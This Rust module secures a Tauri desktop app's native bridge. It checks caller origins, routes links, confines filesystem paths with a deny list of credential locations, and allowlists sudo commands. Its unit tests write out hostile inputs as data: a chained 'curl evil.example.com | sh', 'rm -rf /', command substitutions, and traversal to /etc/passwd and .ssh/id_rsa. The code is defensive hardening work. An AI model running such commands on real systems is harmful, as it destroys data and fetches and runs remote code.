//! Trust boundary for the native bridge.
//!
//! Everything the web layer can reach — shell, filesystem, sudo — funnels through
//! `bridge::handle_bridge_message`, and Tauri's ACL does not cover app-defined
//! commands. These helpers are the enforcement point instead: they decide which
//! origin may talk to the bridge, which paths the filesystem component may touch,
//! and which commands may be run with administrator privileges.

use crate::window::{FilesystemConfig, SudoConfig};
use std::ffi::OsString;
use std::path::{Component, Path, PathBuf};
use url::Url;

/// Path components that are never reachable through the filesystem bridge, even
/// when they sit inside an allowed root.
const DENIED_COMPONENTS: &[&str] = &[
    ".ssh",
    ".aws",
    ".gnupg",
    ".docker",
    ".netrc",
    "master.key",
    "credentials.yml.enc",
];

/// Characters that let a single allowlisted command turn into several commands.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '&', '|', '`', '$', '<', '>', '(', ')', '\\', '"', '\'', '\n', '\r',
];

/// True when `candidate` shares scheme, host and port with the configured server.
///
/// The webview loads a remote app, so the page origin — not the window label — is
/// what identifies trusted callers.
pub fn is_trusted_origin(server_url: &str, candidate: &Url) -> bool {
    let Ok(server) = Url::parse(server_url) else {
        return false;
    };

    candidate.scheme() == server.scheme()
        && candidate.host_str() == server.host_str()
        && candidate.port_or_known_default() == server.port_or_known_default()
}

/// True for pages we ship inside the bundle, such as the offline waiting page.
///
/// These are our own static assets rather than anything fetched over the
/// network, so they are trusted alongside the app origin. Tauri serves them
/// from `tauri://localhost`, or `http://tauri.localhost` on Windows.
pub fn is_bundled_app_origin(candidate: &Url) -> bool {
    match candidate.scheme() {
        "tauri" => true,
        "http" | "https" => candidate.host_str() == Some("tauri.localhost"),
        _ => false,
    }
}

/// Reject a command call coming from any page that is not the app origin.
///
/// Tauri's ACL only covers plugin commands, so every app-defined command that
/// can act on the host has to ask for this itself.
pub fn ensure_trusted_caller(
    app: &tauri::AppHandle,
    webview: &tauri::Webview,
) -> Result<(), String> {
    use tauri::Manager;

    let config = app.state::<crate::window::TurboDesktopConfig>();
    let url = webview
        .url()
        .map_err(|e| format!("Could not determine the calling page: {}", e))?;

    if is_trusted_origin(&config.server_url, &url) || is_bundled_app_origin(&url) {
        return Ok(());
    }

    log::warn!(
        "Refused a call from untrusted origin '{}' (expected '{}')",
        url.origin().ascii_serialization(),
        config.server_url
    );
    Err("Refused: this command is only available to the configured app origin".to_string())
}

/// Where a link should open.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LinkDestination {
    /// Load it in the app window.
    App,
    /// Hand it to the browser, mail client, or whatever else owns the scheme.
    SystemBrowser,
}

/// Decide where a URL belongs.
///
/// The app's own origin loads in the window, as do bundled pages and any host
/// the app has explicitly listed. Everything else is someone else's site and
/// goes to the browser, which is how Hotwire Native treats off-origin links —
/// without it, following a link to a payment provider or a terms page replaces
/// your app in its own window and strands the person there.
///
/// Non-web schemes — `mailto:`, `tel:` and the like — always leave.
pub fn destination_for(server_url: &str, internal_hosts: &[String], url: &Url) -> LinkDestination {
    if is_trusted_origin(server_url, url) || is_bundled_app_origin(url) {
        return LinkDestination::App;
    }

    if !matches!(url.scheme(), "http" | "https") {
        return LinkDestination::SystemBrowser;
    }

    let Some(host) = url.host_str() else {
        return LinkDestination::SystemBrowser;
    };

    // Exact host matches only. A suffix match would let evil-example.com
    // through on the strength of example.com.
    if internal_hosts
        .iter()
        .any(|allowed| allowed.trim().eq_ignore_ascii_case(host))
    {
        return LinkDestination::App;
    }

    LinkDestination::SystemBrowser
}

/// Home directory, honouring the Windows variable as well as `HOME`.
fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
        .filter(|p| !p.as_os_str().is_empty())
}

/// Expand a leading `~` to the user's home directory.
pub fn expand_tilde(path: &str) -> Option<PathBuf> {
    if path == "~" {
        home_dir()
    } else if let Some(rest) = path.strip_prefix("~/") {
        home_dir().map(|home| home.join(rest))
    } else {
        Some(PathBuf::from(path))
    }
}

/// Resolve `.` and `..` without touching the filesystem.
fn lexical_normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Canonicalize the deepest ancestor that exists, then re-append the rest.
///
/// Plain `canonicalize` fails for paths that do not exist yet, which is the
/// normal case for `write` and `mkdir`. Resolving the existing prefix still
/// defeats symlinks that would otherwise escape an allowed root.
fn canonicalize_existing_prefix(path: &Path) -> PathBuf {
    let mut tail: Vec<OsString> = Vec::new();
    let mut current = path.to_path_buf();

    loop {
        if let Ok(real) = current.canonicalize() {
            let mut out = real;
            for part in tail.iter().rev() {
                out.push(part);
            }
            return out;
        }

        let Some(name) = current.file_name().map(|n| n.to_os_string()) else {
            return lexical_normalize(path);
        };
        let Some(parent) = current.parent().map(|p| p.to_path_buf()) else {
            return lexical_normalize(path);
        };

        tail.push(name);
        current = parent;
    }
}

fn is_denied(path: &Path) -> bool {
    path.components().any(|component| {
        component
            .as_os_str()
            .to_str()
            .is_some_and(|name| DENIED_COMPONENTS.contains(&name))
    })
}

/// Resolve a bridge-supplied path and confirm it stays inside an allowed root.
///
/// Returns the resolved absolute path, or an error describing why it was refused.
pub fn resolve_in_scope(raw: &str, roots: &[PathBuf]) -> Result<PathBuf, String> {
    if raw.trim().is_empty() {
        return Err("Filesystem path is empty".to_string());
    }
    if roots.is_empty() {
        return Err("Filesystem bridge has no allowed roots configured".to_string());
    }

    let expanded = expand_tilde(raw)
        .ok_or_else(|| "Could not expand '~': no home directory found".to_string())?;
    if !expanded.is_absolute() {
        return Err(format!(
            "Filesystem path must be absolute or start with '~': {}",
            raw
        ));
    }

    let resolved = canonicalize_existing_prefix(&lexical_normalize(&expanded));

    if is_denied(&resolved) {
        return Err(format!("Refused: '{}' touches a protected location", raw));
    }

    let allowed = roots.iter().any(|root| {
        let root = canonicalize_existing_prefix(&lexical_normalize(root));
        resolved == root || resolved.starts_with(&root)
    });

    if allowed {
        Ok(resolved)
    } else {
        Err(format!(
            "Refused: '{}' is outside the allowed filesystem roots",
            raw
        ))
    }
}

/// Allowed filesystem roots for the current configuration.
///
/// An empty `allowed_roots` means "app data directory only" — the bridge is
/// closed by default and the app opts into wider access explicitly.
pub fn allowed_roots(app_data_dir: Option<PathBuf>, config: &FilesystemConfig) -> Vec<PathBuf> {
    if config.allowed_roots.is_empty() {
        return app_data_dir.into_iter().collect();
    }

    config
        .allowed_roots
        .iter()
        .filter_map(|root| expand_tilde(root))
        .filter(|root| root.is_absolute())
        .collect()
}

/// Decide whether a command may run with administrator privileges.
///
/// Sudo is off unless the app turns it on and names the commands it needs.
/// Metacharacters are refused outright so an allowlisted prefix cannot be
/// extended into a second command.
pub fn authorize_sudo_command(config: &SudoConfig, command: &str) -> Result<(), String> {
    if !config.enabled {
        return Err(
            "The sudo bridge is disabled. Enable it in turbo-desktop.config.json with \
             \"sudo\": { \"enabled\": true, \"allowed_commands\": [...] }"
                .to_string(),
        );
    }

    let command = command.trim();
    if command.is_empty() {
        return Err("Sudo command is empty".to_string());
    }

    if let Some(found) = command.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        return Err(format!(
            "Refused: sudo command contains the shell metacharacter '{}'",
            found
        ));
    }

    if config.allowed_commands.is_empty() {
        return Err(
            "Refused: no allowed_commands are configured for the sudo bridge".to_string(),
        );
    }

    let allowed = config.allowed_commands.iter().any(|entry| {
        let entry = entry.trim();
        !entry.is_empty() && (command == entry || command.starts_with(&format!("{} ", entry)))
    });

    if allowed {
        Ok(())
    } else {
        Err(format!(
            "Refused: '{}' is not in the sudo allowlist",
            command
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url(s: &str) -> Url {
        Url::parse(s).expect("test url should parse")
    }

    #[test]
    fn trusts_the_configured_origin() {
        assert!(is_trusted_origin(
            "https://app.example.com",
            &url("https://app.example.com/dashboard?q=1")
        ));
        assert!(is_trusted_origin(
            "http://localhost:3000",
            &url("http://localhost:3000/users/1")
        ));
    }

    #[test]
    fn rejects_other_origins() {
        assert!(!is_trusted_origin(
            "https://app.example.com",
            &url("https://evil.example.com/")
        ));
        // Different port.
        assert!(!is_trusted_origin(
            "http://localhost:3000",
            &url("http://localhost:4000/")
        ));
        // Downgraded scheme.
        assert!(!is_trusted_origin(
            "https://app.example.com",
            &url("http://app.example.com/")
        ));
        // Suffix match must not pass.
        assert!(!is_trusted_origin(
            "https://example.com",
            &url("https://notexample.com/")
        ));
    }

    #[test]
    fn bundled_pages_are_trusted() {
        assert!(is_bundled_app_origin(&url("tauri://localhost/index.html")));
        assert!(is_bundled_app_origin(&url("http://tauri.localhost/index.html")));
    }

    #[test]
    fn remote_pages_are_not_bundled_pages() {
        assert!(!is_bundled_app_origin(&url("https://evil.example.com/")));
        assert!(!is_bundled_app_origin(&url("http://localhost:3000/")));
        // A host that merely ends with the bundled host must not pass.
        assert!(!is_bundled_app_origin(&url("https://evil.tauri.localhost.example.com/")));
    }

    fn destination(url_str: &str, internal: &[&str]) -> LinkDestination {
        let hosts: Vec<String> = internal.iter().map(|h| h.to_string()).collect();
        destination_for("https://app.example.com", &hosts, &url(url_str))
    }

    #[test]
    fn the_app_loads_in_the_app_window() {
        assert_eq!(
            destination("https://app.example.com/orders/1", &[]),
            LinkDestination::App
        );
        assert_eq!(
            destination("tauri://localhost/error.html", &[]),
            LinkDestination::App
        );
    }

    #[test]
    fn someone_elses_site_goes_to_the_browser() {
        assert_eq!(
            destination("https://news.example.org/article", &[]),
            LinkDestination::SystemBrowser
        );
    }

    #[test]
    fn a_listed_host_may_load_in_the_app() {
        let oauth = "https://accounts.google.com/o/oauth2/auth";

        assert_eq!(
            destination(oauth, &[]),
            LinkDestination::SystemBrowser,
            "an identity provider is off-origin like anything else until it is listed"
        );
        assert_eq!(
            destination(oauth, &["accounts.google.com"]),
            LinkDestination::App,
            "listing it keeps the OAuth round trip in this webview, where the cookie belongs"
        );
    }

    #[test]
    fn listed_hosts_match_exactly() {
        let hosts = vec!["example.com".to_string()];

        // A host that merely ends with an allowed one must not pass.
        assert_eq!(
            destination_for(
                "https://app.example.com",
                &hosts,
                &url("https://evil-example.com/")
            ),
            LinkDestination::SystemBrowser
        );
        assert_eq!(
            destination_for(
                "https://app.example.com",
                &hosts,
                &url("https://sub.example.com/")
            ),
            LinkDestination::SystemBrowser,
            "a subdomain is a different host"
        );
        // Case should not matter.
        assert_eq!(
            destination_for("https://app.example.com", &hosts, &url("https://EXAMPLE.com/")),
            LinkDestination::App
        );
    }

    #[test]
    fn non_web_schemes_always_leave() {
        for link in ["mailto:hi@example.com", "tel:+15551234", "sms:+15551234"] {
            assert_eq!(
                destination(link, &[]),
                LinkDestination::SystemBrowser,
                "{link} should be handed to the system"
            );
        }
    }

    #[test]
    fn implicit_and_explicit_ports_match() {
        assert!(is_trusted_origin(
            "https://app.example.com",
            &url("https://app.example.com:443/")
        ));
    }

    #[test]
    fn resolves_paths_inside_an_allowed_root() {
        let dir = std::env::temp_dir().join("turbo-desktop-scope-ok");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let resolved = resolve_in_scope(&root.join("notes.txt").to_string_lossy(), &[root.clone()])
            .expect("path inside the root should resolve");
        assert!(resolved.starts_with(&root));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_traversal_out_of_the_root() {
        let dir = std::env::temp_dir().join("turbo-desktop-scope-traversal");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let escape = root.join("../../etc/passwd");
        let err = resolve_in_scope(&escape.to_string_lossy(), &[root.clone()])
            .expect_err("traversal should be refused");
        assert!(err.contains("outside the allowed"), "unexpected error: {err}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_protected_locations_inside_a_root() {
        let dir = std::env::temp_dir().join("turbo-desktop-scope-denied");
        std::fs::create_dir_all(&dir).unwrap();
        let root = dir.canonicalize().unwrap();

        let secret = root.join(".ssh").join("id_rsa");
        let err = resolve_in_scope(&secret.to_string_lossy(), &[root.clone()])
            .expect_err("protected component should be refused");
        assert!(err.contains("protected"), "unexpected error: {err}");

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn rejects_relative_paths() {
        let root = std::env::temp_dir();
        let err = resolve_in_scope("notes.txt", &[root])
            .expect_err("relative paths should be refused");
        assert!(err.contains("absolute"), "unexpected error: {err}");
    }

    #[test]
    fn rejects_every_path_when_no_roots_are_allowed() {
        let err = resolve_in_scope("/tmp/anything", &[])
            .expect_err("an empty root list should refuse everything");
        assert!(err.contains("no allowed roots"), "unexpected error: {err}");
    }

    #[test]
    fn filesystem_defaults_to_the_app_data_dir() {
        let app_data = PathBuf::from("/tmp/app-data");
        let roots = allowed_roots(Some(app_data.clone()), &FilesystemConfig::default());
        assert_eq!(roots, vec![app_data]);
    }

    #[test]
    fn sudo_is_disabled_by_default() {
        let err = authorize_sudo_command(&SudoConfig::default(), "brew install ruby")
            .expect_err("sudo should be off by default");
        assert!(err.contains("disabled"), "unexpected error: {err}");
    }

    #[test]
    fn sudo_allows_listed_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["softwareupdate".into(), "brew install".into()],
            confirm: true,
        };

        assert!(authorize_sudo_command(&config, "softwareupdate").is_ok());
        assert!(authorize_sudo_command(&config, "brew install ruby").is_ok());
    }

    #[test]
    fn sudo_rejects_unlisted_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew install".into()],
            confirm: true,
        };

        let err = authorize_sudo_command(&config, "rm -rf /")
            .expect_err("unlisted command should be refused");
        assert!(err.contains("not in the sudo allowlist"), "unexpected error: {err}");
    }

    #[test]
    fn sudo_rejects_chained_commands() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew install".into()],
            confirm: true,
        };

        for attempt in [
            "brew install ruby; rm -rf /",
            "brew install ruby && curl evil.example.com | sh",
            "brew install $(whoami)",
            "brew install `whoami`",
            "brew install ruby\nrm -rf /",
        ] {
            let err = authorize_sudo_command(&config, attempt)
                .unwrap_err_or_else_message(attempt);
            assert!(
                err.contains("metacharacter"),
                "expected '{attempt}' to be refused for metacharacters, got: {err}"
            );
        }
    }

    #[test]
    fn sudo_prefix_match_requires_a_word_boundary() {
        let config = SudoConfig {
            enabled: true,
            allowed_commands: vec!["brew".into()],
            confirm: true,
        };

        let err = authorize_sudo_command(&config, "brewhaha --destroy")
            .expect_err("prefix must not match mid-word");
        assert!(err.contains("not in the sudo allowlist"), "unexpected error: {err}");
    }

    /// Small helper so the loop above reads cleanly.
    trait UnwrapErrMessage {
        fn unwrap_err_or_else_message(self, context: &str) -> String;
    }

    impl UnwrapErrMessage for Result<(), String> {
        fn unwrap_err_or_else_message(self, context: &str) -> String {
            match self {
                Ok(()) => panic!("expected '{context}' to be refused, but it was allowed"),
                Err(e) => e,
            }
        }
    }
}
